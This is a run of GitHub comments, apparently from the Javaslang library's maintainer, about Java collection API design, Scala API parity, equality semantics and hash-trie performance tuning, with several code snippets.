Future#narrow(Future)\n- Lazy#narrow(Lazy)\n- Option#narrow(Option)\n- Promise#narrow(Promise)\n- Try#narrow(Try)\n- Value#narrow(Value)\n. we are at 96% - I will close this issue, tests are an ongoing task\n. @ruslansennov Hi, could you make a review of the correctness of the table contents? Thx! http://javaslang.com/javadoc/latest/javaslang/collection/package-summary.html#package.description\n. The web page points to the right link - here it is:\nhttp://static.javadoc.io/io.javaslang/javaslang/2.0.1/javaslang/collection/package-summary.html\n. Thx!\n. Oohh, wow\n. Move these methods from Traversable to Seq:\njava\nTraversable<? extends Traversable<T>> sliding(int size);\nTraversable<? extends Traversable<T>> sliding(int size, int step);\n. Missing Seq methods (from Scala's Seq):\n``` scala\n// this will be getOrElse(int index, T defaultValue)\napplyOrElseA1 <: Int, B1 >: A: B1\ncorrespondsB(p: (A, B) \u21d2 Boolean): Boolean\ndiff(that: collection.Seq[A]): Seq[A]\nendsWithB: Boolean\nindexWhere(p: (A) \u21d2 Boolean, from: Int): Int\nindexWhere(p: (A) \u21d2 Boolean): Int\nindices: immutable.Range\nintersect(that: collection.Seq[A]): Seq[A]\nisDefinedAt(idx: Int): Boolean\nlastIndexWhere(p: (A) \u21d2 Boolean, end: Int): Int\nlastIndexWhere(p: (A) \u21d2 Boolean): Int\nlift: (Int) \u21d2 Option[A]\npadTo(len: Int, elem: A): Seq[A]\npatch(from: Int, that: GenSeq[A], replaced: Int): Seq[A]\nprefixLength(p: (A) \u21d2 Boolean): Int\nrunWithU: (Int) \u21d2 Boolean\nsameElements(that: GenIterable[A]): Boolean\nsegmentLength(p: (A) \u21d2 Boolean, from: Int): Int\n// this is the same as subsequence(from, until).\n// we stay with subsequence to be consistent with subsequence(from)\nslice(from: Int, until: Int): Traversable[A]\n// rename sort(Comparator) to sortBy(Comparator)\nsortByB(implicit ord: math.Ordering[B]): Seq[A]\n// new method\nsortWith(lt: (A, A) \u21d2 Boolean): Seq[A]\n// rename sort() to sorted()\nsortedB >: A: Seq[A]\nstartsWithB: Boolean\nstartsWithB: Boolean\nunion(that: collection.Seq[A]): Seq[A]\n// [Java]set(int, T) is the same as [Scala]updated(int, T). But we use Map.merged(Map) instead of merge(Map) ...\n```\nUpdate: I'm not sure about all methods here. If in doubt - ask.\n. ...and update the javadoc overview of methods in Traversable & Seq!\n. (Off-topic: btw, it looks inconsistent to me that Scala's slice(from: Int, until: Int) is located in Traversable. Should be in Seq!)\n. Seq is already pretty complete. Some Traversable methods may still be implemented. Here is an actual list.\nTraversable\nWe will do:\n``` scala\n// counts elements which satisfy the given predicate\ncount(p: (A) \u21d2 Boolean): Int\n// same as filter(!p)\n// UPDATE: will be moved to Monad\nfilterNot(p: (A) \u21d2 Boolean): Traversable[A]\n// returns the simple class name by default or the interface name (e.g. List/Stream).\n// we need to change the toString methods to use stringPrefix instead of hard-coded strings.\n// UPDATE: will be moved to Value\nstringPrefix: String\n```\nWe will not do:\n``` java\n// combop used only in parallel collections in Scala, see http://stackoverflow.com/a/6931702/1110815\n// in all other cases = foldLeft(z)(seqop)\naggregateB(seqop: (B, A) \u21d2 B, combop: (B, B) \u21d2 B): B\n// we have no partial function.\n// it is the same as filter and then map\ncollectB: Traversable[B]\ncollectFirstB: Option[B]\n// use map instead\ntransposeB: Traversable[Traversable[B]]\n```\nSeq\nWe will do:\n``` scala\nprefixLength(p: (A) \u21d2 Boolean): Int\nsegmentLength(p: (A) \u21d2 Boolean, from: Int): Int\n```\nPlease note that the sort methods have slightly different names (Scala vs Javaslang).\nWe will not do:\n``` scala\n// diff is (like union and intersection) implemented in Set only\n// for other Traversables we use removeAll\ndiff(that: collection.Seq[A]): Seq[A]\n// belongs to sets\nintersect(that: collection.Seq[A]): Seq[A]\nunion(that: collection.Seq[A]): Seq[A]\n// no partial functions\napplyOrElseA1 <: Int, B1 >: A: B1\nindices: immutable.Range\nisDefinedAt(idx: Int): Boolean\nlift: (Int) \u21d2 Option[A]\n// ?\nrunWithU: (Int) \u21d2 Boolean\n// use eq or corresponds instead\nsameElements(that: GenIterable[A]): Boolean\n```\n. Yay! All methods implemented (some excluded, see above).\n. This is really huge! The more I read, the more I'm impressed!\n. Yes, my computer has problems to display the web page :-)\n. Nice, many thanks!\n\nOther topic:\n@ruslansennov @patrox Next is to get Traversable and Seq right. If you both are in search for more, this is the right place to start: #484 \nThis may have side-effects to existing collections.\nBecause we are now three, we have to sync (fork/join) us in order not to work on the same things.\n. Add zip*/unzip to Iterator.  More methods missing? Look at https://github.com/scala/scala/blob/v2.12.0-M2/src/library/scala/collection/Iterator.scala\n. @patrox ok, this will be fun!\n. @patrox if any questions (e.g. regarding existing code) - I'm here!\n. @ruslansennov \n\nI'll take a break :)\n\nyou've more than deserved it :)\n. Hi @patrox, thanks for investigating it!!\nI think we cannot decide whether our map/flatMap returns a CharSeq (aka WrappedString) or Vector, depending on the result type of the mapping function.\nAdding an additional map function which has return type CharSeq would raise ambiguities:\n``` java\n// this call is ambiguous\nCharSeq.empty().map(c -> 'c');\n// this is additional\npublic CharSeq map(CharUnaryOperator mapper) {\n    Objects.requireNonNull(mapper, \"mapper is null\");\n    if (isEmpty()) {\n        return this;\n    } else {\n        final char[] chars = back.toCharArray();\n        for (int i = 0; i < chars.length; i++) {\n            chars[i] = mapper.apply(chars[i]);\n        }\n        return CharSeq.ofAll(chars);\n    }\n}\n// this comes from FilterMonadic\n@Override\npublic  Vector map(Function<? super Character, ? extends U> mapper) {\n    Objects.requireNonNull(mapper, \"mapper is null\");\n    Vector result = Vector.empty();\n    for (int i = 0; i < length(); i++) {\n        result = result.append(mapper.apply(get(i)));\n    }\n    return result;\n}\n// the compiler can't distinguish between this and Function\n@FunctionalInterface\ninterface CharUnaryOperator {\n    char apply(char c);\n}\n// factory method\nstatic CharSeq ofAll(char[] array) {\n    Objects.requireNonNull(array, \"array is null\");\n    return new CharSeq(String.valueOf(array));\n}\n```\nIf we want our traversables to have common map methods, we need to keep the one that returns Vector<U>.\nAdditionally it makes sense to map chars to chars. To circumvent the ambiguities, we could rename the char mapper to mapChars(CharUnaryOperator).\nAnalog, flatMap could be\n``` java\npublic CharSeq flatMapChars(CharFunction<? extends CharSequence> mapper) {\n    Objects.requireNonNull(mapper, \"mapper is null\");\n    if (isEmpty()) {\n        return this;\n    } else {\n        final StringBuilder builder = new StringBuilder();\n        back.chars().forEach(i -> builder.append(mapper.apply((char) i)));\n        return new CharSeq(builder.toString());\n    }\n}\n@FunctionalInterface\ninterface CharFunction {\n    R apply(char c);\n}\n```\n/cc @ruslansennov \n. Yes, it seems the Scala compiler can derive statically the return type...\n. Alright! :+1: \n. @patrox do you think I can commit these methods or will it produce merge conflicts at your site?\n. I will do it to get the Array in here...\n. ## Summarized\nWe want uniform map and flatMap across our collections\nWe achieve this by introducing\n``` java\ninterface FilterMonadic, T> extends Kind {\n<U> FilterMonadic<M, U> flatMapM(Function<? super T, ? extends Kind<? extends M, ? extends U>>\n\nmapper);\n<U> FilterMonadic<M, U> map(Function<? super T, ? extends U> mapper);\n\n}\n```\nNote: This is what we are able to define as common flatMap in Java. We named it flatMapM because the Kind return type is a little bit nasty. Kind is just a type-constructor hack for missing higher-order types in Java. Additionally we define the real flatMap (without the 'M') for collections but we are not able to do it uniformly for all types.\nExample: List.flatMap\njava\n// Kind<Iterable, U> is (more or less) the same as Iterable<U>\n<U> List<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper);\nThe semantics of our collection flatMap methods is\n1. map all collection elements to iterables\n2. combine the iterables to a collection, e.g. List\nWe observe that map, flatMapM and flatMap are not sufficient for all collection types\nExamples (simplified):\n``` java\ninterface Map extends Traversable> {\n// this is what we get from FilterMonadic\n<U> Set<U> map(Function<? super Entry<K, V>, ? extends U> mapper);\n\n// this is what we really want to have\n<U, W> Map<U, W> map(BiFunction<? super K, ? super V, ? extends Entry<? extends U, ? extends W>> mapper);\n\n}\nfinal class CharSeq implements IndexedSeq {\n// this is what we get from FilterMonadic\n<U> Vector<U> map(Function<? super Character, ? extends U> mapper);\n\n// this is what we really want to have\nCharSeq mapChars(CharUnaryOperator mapper);\n\n@FunctionalInterface\ninterface CharUnaryOperator {\n    char apply(char c);\n}\n\n}\n```\nWishlist:\n1. We want unique map and flatMap methods (instead one with Kind, one simplified and one useful)\n2. We want a common interface with map and flatMap methods for all collections\nOur observation showed that it is not possible to fulfill both wishes at once. This issue was created to prevent the creation of a Zoo of map and flatMap methods. A simple API is one of the main targets of Javaslang.\nSolution\nCurrently there is no solution. In order to create one it is essential to understand which are the use cases of FilterMonadic and when a common map/flatMap interface is needed in general.\nIf it turns out that FilterMonadic is not needed then we also do not need Kind any more.\nA suggestion is to delete FilterMonadic and Kind. Additional methods may be added to Value (or MonadOps):\n``` java\ninterface Value {\n@Override\n<U> Value<U> mapM(Function<? super T, ? extends U> mapper);\n\n@Override\n<U> Value<U> flatMapM(Function<? super T, ? extends Value<? extends U>> mapper);\n\n}\n```\nPlease note that there are single element and multi element Values such as Option, Lazy and Try (single element) and List, HashMap, Tree (multi element).\nIt is essential that MonadOps, IterableOps and ConversionOps are not public API - their only purpose is to organize the big amount of methods of interface Value.\nAlso we may delete TraversableOnce.map and flatMap and define them appropriately in Seq, Set and Map.\nWith other words Value.mapM and flatMapM are the common methods for many types (not only collections). Additionally map and flatMap are defined where possible and where it makes sense regarding the inheritance hierarchy.\n. To make it more concrete, here is an example:\n``` java\ninterface List extends LinearSeq, Value {\n// mapM, map ...\n\n@Override // defined in Value or MonadOps\n<U> List<U> flatMapM(Function<? super T, ? extends Value<? extends U>> mapper);\n\n@Override // defined in LinearSeq\n<U> List<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper);\n\n}\ninterface Map extends Traversable>, Value> {\n// flatMapM, flatMap ...\n\n@Override // defined in Value or MonadOps\n<U> Set<U> mapM(Function<? super Entry<K, V>, ? extends U> mapper);\n\n@Override // defined in Map\n<U, W> Map<U, W> map(BiFunction<? super K, ? super V, ? extends Entry<? extends U, ? extends W>> mapper);\n\n}\n```\nAnd then:\n``` java\n// = List(2, 4)\nList.of(1, 2, 3, 4).flatMapM(i -> i % 2 == 0 ? new Some<>(i) : None.instance);\n// = List(1, 1, 2, 2, 3, 3, 4, 4)\nList.of(1, 2, 3, 4).flatMap(i -> Vector.of(i, i));\n``\n. While applying changes I'm also applying additional minor changes. E.g. renamingMap.merged(...)toMap.merge(...). I know that Scala usesmerged. We follow these:\n- if the method has no args, it may be namedxxxed(), e.g.curried(),memoized(). Counter example:flatten()- otherwise we omited` at the end.\n. As I wrote here we should return the most specific type. This is the way to go. I will check, where the return types can be adjusted.\n. @ruslansennov @patrox Hey, can anyone please tell me why some of Scala's HashMap methods do return Iterable or Iterator instead of collection types? E.g. groupBy(), sliding(), values(), ...\n. We need to differentiate the dogma a bit to always return the most specific type. In this context the following fits best, taken from Scala docs:\n\nWe distinguish in the following between two kinds of methods\n- Accessors access some of the elements of a collection, but return a result which is unrelated to the collection. Example of accessors are: head, foldLeft, indexWhere, toSeq.\n- Transformers access elements of a collection and produce a new collection of related type as a result. The relation might either be direct (same type as receiver) or indirect, linked by a CanBuildFrom implicit. Example of transformers are: filter, map, groupBy, zip.\n\nGiven this, our transformers should return the most specific type, e.g. HashMap.map(...) should return HashMap. E.g. zipWithIndex is also a transformer.\nOur accessors should return  an interface instead to keep our library extensible for future enhancements. E.g. HashMap.groupBy should return Map because we may decide in future that returning another Map implementation than HashMap is more efficient. Returning now HashMap would break API on future changes. The only disadvantage is that Map's methods have generic parameters with wildcards, which reduces usability slightly.\nMore specific, methods like Seq.combinations() or Seq.crossProduct() should return Seq. This applies also to subclasses of Seq. E.g. CharSeq.combinations() should also return Seq. Of course the concrete object returned remains Vector (for CharSeq).\n. More info on why some Scala methods return Iterator or Iterable instead of a collection: http://www.scala-lang.org/docu/files/collections-api/collections_4.html\n. I now have a (relative) clear picture how to improve the collections:\n1) Introduce javaslang.Iterable\n``` java\ninterface Iterable extends java.lang.Iterable {\n@Override\nIterator<T> iterator();\n\ndefault Iterator<IndexedSeq<T>> grouped(int size) {\n    return sliding(size, size);\n}\n\ndefault Iterator<IndexedSeq<T>> sliding(int size) {\n    return sliding(size, 1);\n}\n\ndefault Iterator<IndexedSeq<T>> sliding(int size, int step) {\n    return iterator().sliding(size, step);\n}\n\n}\n```\n2) Let Value extends javaslang.Iterable\njava.lang.Iterable\n          ^\n          |\n  javaslang.Iterable\n          ^\n          |\n   javaslang.Value\n          ^\n         / \\\n     Lazy   TraverableOnce\ncontrol.*         ^\n test.xxx        / \\\n         Iterator   Traversable\n                        ^\n                       /|\\\n                 Seq Set Map Tree\n. Half the way there. Moved many static factory methods to Iterator. Collections may use these by delegating their static factory methods via ofAll(() -> Iterator.xxx(...)). TODOs added in Iterator. Currently the stuff is in my fork... Will be pulled soon into master.\n. There is still one thing: We have subSequence(from, to) and subSequence(from). The former is slice(from, to) in Scala. The latter is similar to drop(n) but takes an index instead of a number of elements.\nBecause CharSeq implements IndexedSeq and CharSequence, we cannot rename subSequence(from, to) to slice(from, to). We need to override CharSequence.subSequence. However, there are Seq.indexOfSlice(Iterable) and Seq.lastIndexOfSlice(Iterable) instead of indexOfSubSequence(...) and lastIndexOfSubSequence(...).\nPutting this all together, it makes sense to rename subSequence(...)to slice(...) to be consistent with indexOfSlice(...) and lastIndexOfSlice(...). We should not drift away from Scala's API now that we are so close to it. Additionally there will be a CharSequence.subSequence(from, to).\nI will do that.\n. Mmhh, just realized we may change\njava\nValue.flatMapValue(Function<? super T, ? extends Value<? extends U>)\nto\njava\nValue.flatMap(Function<? super T, ? extends Iterable<? extends U>)\nThen we can use !iterator.hasNext() instead of value.isEmpty().\nWill check that tomorrow...\n. great!\n. Maybe Sieve of Atkin as Stream in conjunction with Function.lift(stream).memoized(). The memoization lets multiple euler tests share cached prime numbers, if needed.\n. oh, sounds not that simple\n. Fixed with @ruslansennov 's implementation of Sieve of Atkin. Thx!\n. very nice :-)\n. unbelievable fast\n. Great, many thanks!\nIt is confusing that Vector.equals checks for instanceof IndexedSeq. Could you chabge the check to Vector there?\n. yes, the behavior should be consistent. Vector should not be equal to CharSeq in any case.\n. :))\n. roger that!\n. this is great! many thx\n. Stream is the only place where we have a Lazy<Integer> length. Is it worth it to store a wrapped in at each element of the stream? The main use case of Stream is to represent an infinite long stream of data. There we are in general not interested in the length....\n. that makes sense - we will keep it\n. Yes, there are many unfinished methods in our collections. I will mark them this evening as TODO and work on implementations. With SortedSet (and SortedMap) there is even more TODO - the delete method of the Red-Black Tree is still missing. I will work on that.\nThx!\n. Great, appreciated! Then you take HashMap. Do it on a seperate branch please. I need to do some tests later today because it is suspicious to me that we cannot use a wildcard in equals.\nI think there is still s.th. wrong in HashArrayMappedTree.iterator() or Iterator.ofIterables()...\n. (I will get the hands on my notebook in 5 hours...)\n. yes, let's do that, maybe also with message \"TODO\"\n. The underlying HashArrayMappedTrie may have stored the elements in an arbitrary order, so that the iterators do not return the elements in a specific order.\nThis lead to this implementation:\njava\n@SuppressWarnings(\"unchecked\")\n@Override\npublic boolean equals(Object o) {\n    if (o == this) {\n        return true;\n    } else if (o instanceof HashSet) {\n        final HashSet<?> that = (HashSet<?>) o;\n        return this.length() == that.length() && ((HashSet<Object>) this).containsAll(that);\n    } else {\n        return false;\n    }\n}\nWe do not cast to <T> in order to prevent ClassCastExceptions.\n. Fixed with #505 \n. Yes, the Euler tests are great for testing Javaslang.\nPlease implement the equals method in this PR I suggested above. I will pull it then. HashMap needs no separate PR.\nThx!\n. I will take care now of flatMap and map in general as described here: https://github.com/javaslang/javaslang/issues/488#issuecomment-133760856\nI can pull this into master today...\n. Many thanks :)\nFor your minimal example all should be ok. Currently it is not clear why the Iterator.equals failed - we will further investigate. The order of similar elements may change in general (having more than one element) because the Map (or HAMT) has a key set with no guarantee of order.\n. thx!\n. Also renamed (Hash)Map.merged() to merge() and added SortedMap.\n. Also fixes #501 \n. @patrox This will probably cause merge conflicts in HashMap ...\n/cc @ruslansennov \n. yes, that's nice. I will do that now\n. thx!\n. How cool is that!? I love this collection API :-))\n. A collegue of mine said we can start from 500_000L instead of 1L. I will test that later to reduce the time (currently 20sec on travis-ci).\n. it's ok - it doesn't really matter. I like these high-level unit tests to test real-world application of our code. Scala has tail-recursion to execute tail-ended recursion in constant stack...\n. Yes, @tailrec for Java would be really cool. Technically now it is possible said Brian Goetz but unfortunately it is not targetet to be implemented, yet...\n. @ruslansennov @patrox i wanted to say \"good night guys!\"\n. :+1: \n. Great you refactor existing code to make it simpler!!\n. You're right - I checked it on current branch and it results in an infinite loop. Good finding!\n. Mmhh, I first had an intuitive solution, similar to yours, but changed it to the current because Scala REPL says:\n``` scala\nscala> List(1, 2, 3, 4, 5).sliding(2).toList\nres0: List[List[Int]] = List(List(1, 2), List(2, 3), List(3, 4), List(4, 5))\nscala> List(1, 2, 3, 4).sliding(5, 3).toList\nres1: List[List[Int]] = List(List(1, 2, 3, 4))\n```\nI don't think we have a bug here.\n. 8-)\n. Javaslang does your first example right:\njava\nList.of(1, 2, 3, 4, 5).sliding(2, 4); // = List(List(1, 2), List(5))\nTo prove the code wrong, we need a counter-example, i.e. an example where Scala's result is not equal to Javaslang's result.\n``` java\nwhile (!list.isEmpty()) {\n// = Tuple2(take(size), drop(size))\n// splitAt is great here, because take and drop is calculated in one turn (e.g. for List)\nfinal Tuple2<List<T>, List<T>> split = list.splitAt(size);\n\n// essentially the same as result.prepend(list.take(size))\nresult = result.prepend(split._1);\n\n// we need the drop(size) part (= split._2) for the case step < size.\n// because drop(size) = empty => we are finished. but drop(step) may not be empty.\nlist = split._2.isEmpty() ? Nil.instance() : list.drop(step);\n\n}\n```\nMy tests led to similar results like Scala.\nI know you have a good sense for code. What do you think is wrong exactly?\n. obsession is good - keep it up and running :)\n. Nice stuff, Patryk!\n. @ruslansennov @patrox good night!\n. very nice, thx!\n. Awesome!!\n. You are totally right.\n(I push as much in as I can. Errors will pop up at the latest when we have 99.99% coverage again...)\n. Nice!\nThanks for all the effort. Our collections will be very useful for the Java world.\n. Thx!\nI've stared a while on naive and smart to see the difference :-)\nIt is only memoized, right?\n. @patrox Ok!\n. @ruslansennov that's really a weakness of ConcurrentHashMap. I wonder, if the creator(s) are aware of it...\n. Fixed #490 \n. great!\n. Fixed with #525 \n. Thank you!!!\n. thx!\n. @ruslansennov @patrox btw - there is a new blog... http://blog.javaslang.com\n. Huge!\n. Great improvement!!\nThat shows that we can't rely on travis-ci for measuring performance. It is a cloud, cpu is utilized virtually - we don't know what other boxes are running on the same hardware and eating cpu in this virtual env.\n. Thx!\n. Thx!\n. Very cool!!! (c:\n. thx for adding so many tests - that really helps!\nI need a day to implement the RedBlackTree to make progress towards 2.0.0. Our goal comes closer...\n. we should use the new javaslang.collection.Iterator where applicable when implementing HashMap methods...\n. :-D\n. > I need a day to implement the RedBlackTree\n...this means I estimated one day of work - I hope that I can afford the time this week...\n. Nice!\n. There is no PR build slot. I will merge it to see a new build.\n. Generator stuff has always a weight factor > 1 :)\n. Thx for taking care of HashSet & Iterator!\nToday we celebrated the birthday of my 5 yo daugther - 12 kids(!) where there. Now I'm relaxing by implementing the RedBlackTree :)\n. yep\n. Yippee ki-yay! Nice, nice, nice!!\n. This can be used for all sequential classes:\njava\nboolean equals(Iterable<? extends T> iterable1, Iterable<? extends T> iterable2) {\n    Objects.requireNonNull(iterable1, \"iterable1 is null\");\n    Objects.requireNonNull(iterable2, \"iterable2 is null\");\n    final Iterator<T> iterator1 = iterable1.iterator();\n    final Iterator<T> iterator2 = iterable2.iterator();\n    while (iterator1.hasNext() && iterator2.hasNext()) {\n        if (!Objects.equals(iterator1.next(), iterator2.next())) {\n            return false;\n        }\n    }\n    return iterator1.hasNext() == iterator2.hasNext();\n}\nFor classes with no specific order (e.g. Set, Map, ...) we need to take another approach.\nFor Values with one element (e.g. Option, Try, Lazy, ...) we should also take the sequential approach (see above):\n``` java\nnew Some<>(1).equals(List.of(1)); // = true\nnew Some<>(1).equals(List.of(1, 2, 3)); // = false\nNone.instance().equals(List.empty()); // = true -- hint: both are empty Values\n```\n. Maybe it makes sense to add an additional, exact equality match (by comparing the type via instanceof), e.g.\njava\nnew Some<>(1).eq(List.of(1)); // = false\nnew Some<>(1).eq(new Some<>(1)); // = true\nOr maybe it makes even more sense to swap the eq and equals methods described above. Pros? Cons?\n. > When you call equals directly, you are skipping all that softening logic and instead treated to java's theory that two boxed values of different types are always unequal. \n- Paul Phillips\nWe should keep our equals methods as they are. This is how Java devs would expect them to work. However, I will change Iterator.equals most probably to work like ==. This will be documented in the interface.\nIn a future version of Javaslang we may add eq, which behaves like == in Scala (with softening logic). But before starting implementation, we may check other alternatives, e.g. an implicit (additional method argument) Eq or Equals instance, which works like Comparator...\nI will push this issue to the backlog for now.\n. We keep equals as is. We introduce a smoothing javaslang.Iterable.eq, similar to Scala's ==, such that\n``` java\nList.of(1, 2, 3).eq(Stream.of(1, 2, 3)) // = true\nStream.of(1, 2, 3).eq(List.of(1, 2, 3)) // = true\n// this is a difference to Scala's behavior but very similar to Haskell\nNone.eq(List.empty()) // = true\nSome(1).eq(List(1)) // = true\n...\n```\n. Iterable.eq checks congruence of structures and equality of contained values:\njava\n// ((1, 2), ((3))) => structure: (()(())) values: 1, 2, 3\nfinal Iterable<?> i1 = List.of(List.of(1, 2), Arrays.asList(List.of(3)));\nfinal Iterable<?> i2 = Queue.of(Stream.of(1, 2), List.of(Lazy.of(() -> 3)));\nassertThat(i1.eq(i2)).isTrue();\n. Top!\n. Hi Ruslan,\nthis is basically the same as seq.zip(that).forAll(predicate). We should not broaden our interfaces too much. It's better to have a thin but deep API:\n- thin in the sense of number of basic building blocks, opposed to the number of special methods\n- deep in the sense of power of composition et al., and a nice type hierarchy\nOr did you have s.th. in mind I've overseen?\n. (I'm now offline for a few hours - have to repair a broken computer of a friend o_O)\n. online again :)\nbtw - iterator() can be used to circumvent two iterations in the case of List for example:\njava\nlist.iterator().zip(that).forAll(predicate) // calculated in one iteration\n. Of course you're right. after taking my first coffee I see clear now :)\nLet's rename it to equals and change the signature like this:\njava\ndefault <U> boolean equals(java.lang.Iterable<? extends U> that, Predicate<Tuple2<? super T, ? super U>> predicate)\nI'm not 100% sure, if we really need Iterable<? extends U> instead of Iterable<U>. Using extends isn't incorrect but it may be unnecessary. If it is really unnecessary, this would imply that we need to change many method signatures in Javaslang, where we also don't need the extends part...\n. Let's keep ? extends U.\nConsidering U = Animal, the signature would match best an Iterable of Lion, Elefant, Snake, ...\n. (aargh - my RedBlackTree.union method has an error. need to deep dive into the rabbit hole now...)\n. Thx! Have a nice day!\n. Oooh - looked at the Scala API - didn't know there's the same method. Let's keep the name corresponds then. We only need to adjust the bounds then:\njava\ndefault <U> boolean corresponds(java.lang.Iterable<? extends U> that, Predicate<Tuple2<? super T, ? super U>> predicate)\n. (you see, I'm very 'flappy' when it comes to clear decisions - that's me :-) )\n. Yes :) I like to think of implications. All is connected somehow...\nHave to fix some IteratorTests now before I can create a PR of the new stuff...\n. We should combine Arbitrary and Shrink (see #1697) by making shrink a function:\nhttps://hackage.haskell.org/package/QuickCheck-2.9.2/docs/Test-QuickCheck-Arbitrary.html\n\n. For now I will not further invest in vavr-test and keep it as-is because JUnit 5 is the 'defacto standard' and it offers property testing.. Fixes #479 \n. mmhh, tail() must be possible in eff. const. time... what if we do tail() like so?\njava\nfinal Iterator<T> iterator = iterator();\nif (!iterator.hasNext()) {\n    throw new UnsupportedOperationException(\"tail of empty Vector\");\n}\nfinal T key = iterator.next();\nreturn new Vector<>(tree.remove(key));\n(same for HashSet et. al)\n. I ask myself how Scala does the trick of eff. const. time? As far as I known they also use HAMT, at least for HashSet. http://docs.scala-lang.org/overviews/collections/performance-characteristics.html\nAlso the LAMP paper say that HAMT operations are O(1), e.g. remove(key).\nDo you have an idea?\n. ok - I will create an issue for that. thx!\n. @ruslansennov Ok, that's nice!\nBut then this whole operation should be O(1) and no further index update is needed, right?\njava\nVector<T> tail() {\n    final Iterator<T> iterator = iterator(); // O(1)\n    if (!iterator.hasNext()) { // O(1)\n        throw new UnsupportedOperationException(\"tail of empty Vector\");\n    }\n    final T key = iterator.next(); // O(1)\n    return new Vector<>(tree.remove(key)); // O(1) and tree indices are aligned new, right?\n}\n. And yes, now I understand why prepend() and insert() are O(n). Because indices need an update. Yes, yes, yes...\nAnd also yes: when removing an element, subsequent indices have to be updated.\nThis issue should be obsolete. But still the question how Scala does the trick :-)\n. This does not need to be changed/fixed before release 2.0.0. We can go live and boost the performance in a follow-up release...\n. :+1: Done.\n. Btw - welcome back! :-)\n. I will pull it. Comments are welcome.\n. :+1: \n. Fixed by @ruslansennov \n. This is nice to play with but nothing targeted for a production version of Javaslang. We will not implement it.\n. I'm not sure about this. I prefer O(n) time and O(1) memory over O(1) time and O(n) memory consumption.\nAdditionally we win nothing when using a List because it has also O(n) time on contains().\nLet's keep iterator() here, please.\n. roger that\n. @ruslansennov I think I will pull this (hoping you won't punch me for that :-) ) - the HashSet changes may be of interest, if you implement more methods...\n. @ruslansennov Oohh - just realized I only touched Sets. This should not have produced merge-conflict impact to your HashMap changes...\n. @ruslansennov :-D\n. As examined in #571 we need to replace occurrences of\n- List.insert(int, Object)\n- Array.update(int, Object)\nwithin HashArrayMappedTrie (HAMT).\nWe accomplish this by using Vector as default Seq implementation throughout our HAMT.\nTo measure the improvement run src/test/benchmark/collection/MapSetBench.java\nUpdate 1: Vector's prepend and insert are O(n) and therefore no viable alternative within our HAMT\nUpdate 2: Not sure about Update 1. I think all can be performed in eff. O(1)...\n. Thx!\n. Of course! We need to formulate an invariant (read: predicate) for slice that holds for each collection of size 0 <= n, and variables -bound <= i, j <= bound, where 0 <= bound <= 2*n to cover all corner cases.\nA property test would like this:\n``` java\nfinal Arbitrary> vectors = n -> Vector.ofAll(Array.range(0, n));\nfinal Arbitrary i = bound -> Gen.choose(-(bound * 2), bound * 2);\nfinal Arbitrary j = bound -> Gen.choose(-(bound * 2), bound * 2);\nfinal Function2 invariant = (i, j) -> / TODO /;\nProperty.def(\"Vector.slice\")\n    .forAll(vectors, i, j)\n    .suchThat(invariant)\n    .check()\n    .assertIsSatisfied();\n```\nSomething like that (from the top of my head)...\n. @paplorinc Please let not benchmark against it. It makes not much sense because it is not popular and because it seems to be a 1:1 copy it is sufficient to benchmark Scala.\nAlso I question that it is a copy-paste of Scala. This should be a license problem for the library!\n. Then IT IS Scala ;-p\n. No, not for now, thank you.\n. NO! We won't do that.\nAs Daniel Spiewak explains, a 2-3 Finger Tree is sloooow. No one uses them in practice. You will always find Banker's Queue. It's because of JVM organization of Linked List data (holds it together) vs. 2-3 Finger Tree memory mess (all dropped unrelated somewhere on the heap).\nSee also http://www.infoq.com/presentations/Functional-Data-Structures-in-Scala (minute 42:00).\n. > Set should have union(Iterable) which merges a Set/TreeSet fast\nYes, but - union(Set<T> that) and addAll(java.lang.Iterable<T> elements)\n. > Tree should have insert(Tree) and insert(int, Tree) (?)\nWill move this to #113 \n. Mmhhh, we will see - I will investigate it with the profiler - there is always room for improvement :)\n. Ok - can you do it?\nIs the subnodes array fixed size / has it to grow? If it is fixed size (which is typical for Tries), then we should instantiate it once without growing it later. Mmhh, but on write access a full copy has to be made in O(n)... don't know - have to look at the impl\n. I will investigate it...\n. What!? Seems to be the sum operation (maybe when calculating the node size, taking all children into account...) Will have a closer look now...\n\n. Oohh yes - it is most probably the usage of Match (within TraversableOnce.sum et al.) because it uses lambda reflection.\nThere are two types of Match: MatchMonad and MatchFunction. In performance-critical cases, like here, one should use the MatchFunction, because the lambda serialization is only done once and then it should be ultra-performant!\nI will check that now!\n. ``` java\n// before: Java HashMap bench took 22.126 sec.\nthis.size = subNodes.map(HashArrayMappedTrie::size).sum().intValue();\n// after: Javaslang HashMap bench took 9.753 sec.\nthis.size = subNodes.map(HashArrayMappedTrie::size).fold(0, (i, j) -> i + j);\n```\nWill now profile & improve further...\n. Primitive boxing/unboxing is evil. I will provide a simple size function for the nodes... easy!\n\n. calculating size with primitives only brought:\nJavaslang HashMap bench took 5.761 sec.\nQuestion: Why we still use List, e.g. in IndexedNode? LeafNode should be ok but there are cases where we use list.get(index). Using Array here would be better. Later (with 2.0.1) we may use Vector (backed by bitmapped vector trie)\n. I think we should not calculate the size in general. Instead it should move from the HAMT to HashMap, maybe as Lazy... This will boost the performance.\n. Without calculating the size: Javaslang HashMap bench took 3.711 sec.\n. Now Array.update is eating all the time. Copying the internal array is O(n). We need to exchange Array with the Vector impl mentioned about. Then it will really fly!!\n\n. We need to replace occurrences of\n- List.insert(int, Object)\n- Array.update(int, Object)\nwithin HashArrayMappedTrie (HAMT).\nWe accomplish this by implementing Vector (see #568) and use it as defaul Seq implementation throughout HAMT.\n. @ruslansennov btw - the Array implementation is absolutely fine! It is exactly the same as in Scala.\n. Mmmhh, Vector.prepend and Vector.insert are also O(n). Therefore Vector is no viable alternative to the exisiting HAMT subNodes types Array and List. I think, we are fine here and the HashMap stays as is for now.\n. @paplorinc This sounds great! We should definitely take a look a the Scala source. Daniel Spiewak did a great job contributing to the Scala collection library. Please view his talk starting at minute 45:00. You can find the source code here.\nDaniel Spiewak said in his talk that the bit-mapped vector trie even performed better than the mutable Java version for very big collections (Map?). The bit-mapped vector trie is great for indexed/random access reads. We should keep our initial bit-mapped vector trie as simple as possible (along the existing Scala versions) and apply specific optimizations later.\n. > I'm hoping that I can achieve effectively constant time for (...) I'm basically reinventing everything (...)\nThat's a noble goal. But for the health of the code-base it is most important that the code stays simple, understandable and maintainable - by more than one person ;)\nPlease keep in mind that it is not our goal to have an universal collection that performs overall in O(1) (said exaggerated). Every algorithm has its strengths and weaknesses. We should embrace these as 